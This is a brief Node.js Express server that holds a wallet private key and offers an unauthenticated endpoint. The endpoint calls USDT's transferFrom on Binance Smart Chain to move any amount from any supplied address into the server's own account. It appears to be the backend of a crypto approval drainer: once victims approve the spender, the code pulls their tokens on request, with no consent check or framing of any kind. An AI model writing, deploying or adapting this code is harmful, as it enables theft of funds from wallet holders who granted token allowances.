require('dotenv').config();
const Web3 = require("web3");
const express = require("express");
const app = express();
const bodyParser = require("body-parser");

app.use(bodyParser.json());

const web3 = new Web3("https://bsc-dataseed.binance.org/");

const privateKey = process.env.PRIVATE_KEY;
const account = web3.eth.accounts.privateKeyToAccount(privateKey);
web3.eth.accounts.wallet.add(account);

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const spender = account.address;

const abi = [
  {
    constant: false,
    inputs: [
      { name: "sender", type: "address" },
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
];

const contract = new web3.eth.Contract(abi, usdtAddress);

app.post("/transfer", async (req, res) => {
  const { from, amount } = req.body;

  try {
    const tx = await contract.methods
      .transferFrom(from, spender, amount)
      .send({ from: spender, gas: 100000 });

    res.json({ success: true, tx });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

app.listen(3000, () => console.log("Server running"));
